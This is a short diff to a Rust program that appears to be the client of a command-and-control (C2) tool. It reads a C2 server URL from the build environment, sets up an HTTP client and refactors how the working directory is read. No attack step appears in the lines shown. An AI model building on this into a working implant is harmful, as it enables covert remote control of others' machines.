@@ -38,9 +38,8 @@ fn main() -> Result<()>{
     let url = env!("C2_URL", "Set the C2_URL environment variable with the address of your C2 server");
     let timeout = Duration::new(5,0);
     let client = Client::builder().timeout(timeout).build()?;
-    let mut cwd: String = "".to_string();
-    match env::current_dir() {
-        Ok(dir) => dir.to_str(),
+    let mut cwd: String = match env::current_dir() {
+        Ok(dir) => dir.into_os_string().into_string().unwrap(),
         Err(_) => panic!()
     };
 
